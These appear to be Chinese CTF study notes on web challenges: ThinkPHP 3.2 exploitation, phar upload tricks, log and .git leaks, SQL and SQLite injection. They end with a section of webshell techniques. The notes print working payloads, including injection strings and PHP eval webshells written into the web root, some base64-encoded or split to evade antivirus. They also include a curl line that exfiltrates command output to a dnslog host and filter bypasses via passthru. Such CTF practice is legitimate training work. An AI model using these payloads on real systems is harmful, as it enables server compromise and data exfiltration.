![1678435818737.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678435825801-db90d4a5-ad15-4268-bbe0-e1586d19bef4.png#averageHue=%23fcfaf9&clientId=u5e7ba7e9-411a-4&from=paste&height=263&id=u98d1f1c1&originHeight=579&originWidth=1281&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=64886&status=done&style=none&taskId=ud5ebb38b-65d9-46ff-954a-3c44832d7a8&title=&width=582.272714652306)

- 这里可以上传文件，但是后缀不能是php
- 上传序列化的phar文件，后缀命名为.png

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678436386308-3a5c84f8-90f3-4f55-943d-5ecbdf1a8afd.png#averageHue=%23faf7f7&clientId=u5e7ba7e9-411a-4&from=paste&height=88&id=ued776cc4&originHeight=193&originWidth=1077&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=58164&status=done&style=none&taskId=u2d932cf4-ebc5-45e3-8682-28aac624a69&title=&width=489.5454439348428)

- 在第一个php界面传入数据，
```php
pre=phar:///img/9eb9cd58b9ea5e04c890326b5c1f471f.png
```
# thinkphp专题
## web 569
[URL模式 · ThinkPHP3.2.3完全开发手册 · 看云](https://www.kancloud.cn/manual/thinkphp/1697)
### Url模式

- 入口文件是应用的单一入口，对应用的所有请求都定向到应用入口文件，系统会从URL参数中解析当前请求的模块、控制器和操作：

http://serverName/index.php/模块/控制器/操作
#### URL大小写
```php
'URL_CASE_INSENSITIVE'  =>  true, 
```

- 当URL_CASE_INSENSITIVE设置为true的时候表示URL地址不区分大小写，这个也是框架在部署模式下面的默认设置。
#### 普通模式

- 也就是传统的get方式
```php
http://localhost/?module=home&controller=user&action=login&var=value
```
#### PATHINFO模式

- 系统默认的模式
- PATHINFO地址的前三个参数分别表示**模块/控制器/操作**
```php
http://localhost/index.php/home/user/login/var/value/
```

- 上面的也可以写成
```php
http://localhost/index.php/home/user/login/?var=value
```
## web 570
[http://096eff82-c7ca-460a-badf-6ab655523d93.challenge.ctf.show/](http://096eff82-c7ca-460a-badf-6ab655523d93.challenge.ctf.show/)
### 闭包路由
[ThinkPHP3.2学习——路由_闭包支持 - 禁丿Memory - 博客园](https://www.cnblogs.com/leqing/p/6861644.html)
```php
'blog/:year/:month' =>
function($year,$month){
echo 'year='.$year.'&month='.$month;
}
```

- 如果我们访问的URL地址是： http://serverName/Home/hello/thinkphp

则浏览器输出的结果是： Hello,thinkphp
### 题目分析
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678781815265-620c4d29-f980-4705-8015-49013bd0ab85.png#averageHue=%23222120&clientId=uca3f5732-314b-4&from=paste&height=395&id=u21171f5b&originHeight=868&originWidth=1305&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=129985&status=done&style=none&taskId=ueea2054f-cbc0-4cc5-bb87-28e28cc2487&title=&width=593.1818053249488)

- 在config.php中发现了一个闭包路由
- 见到`call_user_func`直接传`system`函数
- 但是没法传`ls /`会影响路径的判断，用`assert`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678783176911-fc6f084c-99c3-4402-918f-b84d33c2d054.png#averageHue=%23fefefe&clientId=uca3f5732-314b-4&from=paste&height=410&id=u93a65887&originHeight=902&originWidth=2077&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=60016&status=done&style=none&taskId=ub82f702e-ee77-450d-ba57-cc7e5952d3e&title=&width=944.0908886282901)

- 这个题传一个assert不行

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678783404699-bb66b7f9-e4a2-415d-ac93-bc988ddec44a.png#averageHue=%23f5f5f5&clientId=uca3f5732-314b-4&from=paste&height=151&id=uf7626c47&originHeight=333&originWidth=1950&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=76175&status=done&style=none&taskId=u5c3a89d9-55c3-4490-a3a9-487d8287efd&title=&width=886.3636171522223)<br />[PHP的回调后门_”<? mb_ereg_replace(‘.*‘, $_request[‘pass’], ″, \_bfengj的博客-CSDN博客](https://blog.csdn.net/rfrder/article/details/109136388)
## web 571 show方法参数可控
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678784780836-a9806062-79a8-460e-802b-6b10cd25b664.png#averageHue=%23201f1f&clientId=uca3f5732-314b-4&from=paste&height=201&id=u1afb550d&originHeight=443&originWidth=1974&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=69001&status=done&style=none&taskId=ubfafd963-1e33-4024-8e68-5ecdfc8fa72&title=&width=897.272707824865)

- 在/Application/Home/Controller/IndexController.class.php文件中，发现这里的`show`方法中传入的参数`n`是可以控制的
- 追踪thinkphp3的源码
```php
protected function show($content,$charset='',$contentType='',$prefix='') {
        $this->view->display('',$charset,$contentType,$content,$prefix);
    }
//既然题目要求的是渲染view中的内容，那就跟踪view中的display函数
——————————————————————————————————————————————————————————————————————————————————
public function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') {
        G('viewStartTime');
        // 视图开始标签
        Hook::listen('view_begin',$templateFile);
        // 解析并获取模板内容
        $content = $this->fetch($templateFile,$content,$prefix);
        // 输出模板内容
        $this->render($content,$charset,$contentType);
        // 视图结束标签
        Hook::listen('view_end');
    }

---------------------------------------------------------------------------------
public function fetch($templateFile='',$content='',$prefix='') {
        if(empty($content)) {//此处不为空，可以直接pass掉
            $templateFile   =   $this->parseTemplate($templateFile);
            // 模板文件不存在直接返回
            if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
        }else{
            defined('THEME_PATH') or    define('THEME_PATH', $this->getThemePath());
        }
        // 页面缓存
        ob_start();
        ob_implicit_flush(0);
        if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // 使用PHP原生模板(此处函数C的作用是优先执行设置获取或赋值,它有一个名字叫动态配置)
            $_content   =   $content;
            // 模板阵列变量分解成为独立变量
            extract($this->tVar, EXTR_OVERWRITE);//EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。
            // 直接载入PHP模板
            empty($_content)?include $templateFile:eval('?>'.$_content);//此处为命令执行点
        }else{
            // 视图解析标签
            $params = array('var'=>$this->tVar,'file'=>$templateFile,'content'=>$content,'prefix'=>$prefix);
            Hook::listen('view_parse',$params);
        }
        // 获取并清空缓存
        $content = ob_get_clean();
        // 内容过滤标签
        Hook::listen('view_filter',$content);
        // 输出模板文件
        return $content;
    }

```

- display方法会调用`fetch`方法
- `fetch`方法中`if('php' == strtolower(C('TMPL_ENGINE_TYPE')))`就会执行eval代码
## web 572 tp3.2日志泄露
### 0x01
:::info
thinkphp3.2结构：Application/Runtime/Logs/Home/18_07_27.log<br />thinphp3.2解析：Application/Runtime/Logs/Home/yy_MM_dd
:::

- thinkphp在开启debug的情况下，会在Runtime目录中生成日志，所以如果没有做好目录限制，就可以访问

该目录。






- 访问`/Application`，发现是禁止的

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678851200839-d0ebed11-a7cb-4b27-862a-1cede3a977ae.png#averageHue=%23f9f8f7&clientId=u40e22dad-ff61-4&from=paste&height=188&id=u4c657698&originHeight=414&originWidth=1620&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=68222&status=done&style=none&taskId=u1e25b238-9554-4da9-b846-952088cb181&title=&width=736.3636204033847)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678851696403-3b408a50-cae1-4cec-a389-762cc75cd889.png#averageHue=%23f6f6f6&clientId=u40e22dad-ff61-4&from=paste&height=376&id=uf0590faf&originHeight=827&originWidth=1749&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=47077&status=done&style=none&taskId=ufd96c9d3-7886-487b-a4d5-2ab979e5022&title=&width=794.9999827688395)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678851715583-e2714f29-d4f2-48f2-bd68-15f61fbe7ac4.png#averageHue=%23f7f6f6&clientId=u40e22dad-ff61-4&from=paste&height=387&id=u123be467&originHeight=852&originWidth=1745&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=42921&status=done&style=none&taskId=u126f5520-5c4e-41fe-8cd9-5105cf94321&title=&width=793.1818009900657)

- 这里把日期格式改成`yy_MM_dd`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678851769573-6954b58c-76d4-44bd-a81f-c9d2f382b48d.png#averageHue=%23f9f3ef&clientId=u40e22dad-ff61-4&from=paste&height=182&id=u39f2a308&originHeight=400&originWidth=1374&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=21732&status=done&style=none&taskId=ubc69ffd7-64f3-42af-90f7-515bc749fad&title=&width=624.5454410087966)

- 访问后发现

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678851854699-ae1dab13-c522-4ebc-90aa-8af86ba54c79.png#averageHue=%23f3f3f3&clientId=u40e22dad-ff61-4&from=paste&height=425&id=u8abe32f6&originHeight=934&originWidth=1238&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=71689&status=done&style=none&taskId=u4d26c652-a7b5-4a50-8d8e-08d29773c30&title=&width=562.7272605304878)

- 直接访问这个rce
# 
# 
# 6. XFF_referer

-  X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项 
-  HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的 
# 7. 备份文件

- 常见的备份文件后缀名有 `.git .svn .swp .~ .bak .bash_history .phps`

### 7.1 git源码泄露

-  当在一个空目录执行 git init 时，Git 会创建一个 .git 目录。 这个目录包含所有的 Git 存储和操作的对象。 如果想备份或复制一个版本库，只需把这个目录拷贝至另一处就可以了 
   -  比如某个网站存在.git文件泄露，可以： 
```
http://www.baidu.com/.git
```
 

-  用githack工具下载整个.git备份文件<br />在GitHack目录打开cmd 
```
GitHack.py http://xxxx/.git
```
 

**常见的源码泄露**

- [https://lddp.github.io/2018/05/10/WEB-%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F/](https://lddp.github.io/2018/05/10/WEB-%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F/)

# 

# 9. 闭合那些事

### 9.1 sql语句闭合

```sql
$res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
```

- 这里面$user是通过get获取的参数
- 通过'order by 3 --+闭合 
   - 因为是字符串拼接，所以我输入的东西自动加上双引号
   - 因为是字符串，注释掉的是字符串后面的内容，不是注释整个居于

#### 二次注入闭合

对于该语句

```sql
select username from table where username = '传递的参数
```

对应的payload

```sql
0'+ascii(substr((select * from flag) from 1 for 1))+'0
```

# 10. sqlite注入

-  SQLite 数据库中有一个叫 SQLite_master 的表它定义数据库的模式。 SQLITE_MASTER 表看 起来如下： 
```sql
 CREATE TABLE sqlite_master ( 
     type TEXT， 
     name TEXT, 
     tbl_name TEXT, 
     rootpage INTEGER, 
     sql TEXT 
 );
```
 

-  对于表来说，type 字段永远是’table’,name 永远是表的名字 Sqlite_master 隐藏表如下

**爆表名**

假设通过order by已知有2列,第2列回显

```sql
union select 1,name from sqlite_master where type='table' order by name
```

**查询他的sql语句**

```sql
union select name,sql from sqlite_master --+
```

或者用

```sql
union select 1,(select sql from sqlite_master limit 0,1) --+
```

**爆破字段**

```sql
union select id,id from Users limit 0,1
union select id,name from Users limit 0,1
union select name,password from Users limit 0,1
```

# 14. wget

[wget命令详解 - 玩转大数据 - 博客园 (cnblogs.com)](https://www.cnblogs.com/sx66/p/11887022.html)

-  批量下载工具 
```
wget ip -r -np -nd -A .pdf
```
 

-  参数解释： 
```
-r：递归下载
-np, --no-parent                 不追溯至父目录
-nd, --no-directories           不创建目录
-A,  --accept=LIST               逗号分隔的可接受的扩展名列表。
//上面意思是下载.pdf文件
```
 

# 15. 0day
### 编辑器

-  编辑器的页面，点击图片上传，如果服务器设置的图片上传路径不存在，会默认访问服务器的根目录。<br />**某编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录** 

# 16.写木马可能遇到的问题
## phpinfo + 🐎

- 不知道上传的马是否成功，因此加phpinfo
## 过滤system->命令执行无回显

- dnslog带外，wget或者curl
- 如果还是显示不了，尝试用base64编码
```shell
shell_exec('curl `pwd|base64`.x3c7at.dnslog.cn')
```

- 写🐎
```php
shell_exec('echo "<?php eval($_POST[1])?>" > /var/www/html/basic/web/1.php')
```
### 
## $需要转义
:::info
**有时候外面是单引号，里面是双引号执行不了，需要多尝试一下**
:::

- 当使用shell_exec时，外面是双引号，里面是单引号，就需要转义
```php
shell_exec( "echo '<?php echo 111111;eval(\$_POST[1]);?>' > /var/www/html/basic/web/2.php";)

```
## 过滤system
[https://www.php.net/manual/zh/function.passthru.php](https://www.php.net/manual/zh/function.passthru.php)

- 使用passthru绕过，且有回显 ，太牛逼了
## 直接用system
```php
<?php system('cat /var/www/html/alsckdfy/check.php > /var/www/html/1.txt')?>
```

- `system`直接执行命令
## 免杀马
:::info
前面的字符串是对`<?php eval($_POST[1]);?>`进行`base64`加密的结果
:::
```php
<?php 
system('echo "PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==" | base64 -d > /var/www/html/shell.php');
?>
```
**方法2：**
```php
<?php
$s = '<?ph'.'p ev'.'al($_PO'.'ST[1]);?>';
file_put_contents('/var/www/html/1.php',$s);
?>
```

- 目前我还没成功

## shell_exec无回显
:::info

- `requestbin`带出
- 写`$`转义马
- `cp`或者`mv`复制

`**;**`**截断签名的命令**
:::

```php
shell_exec(';echo  "<?php eval(\$_POST[1]);?>" >a.php;')

 shell_exec(';cp /var/www/html/flag.php /var/www/html/1.txt') 
shell_exec(';mv /var/www/html/flag.php /var/www/html/1.txt') 
```





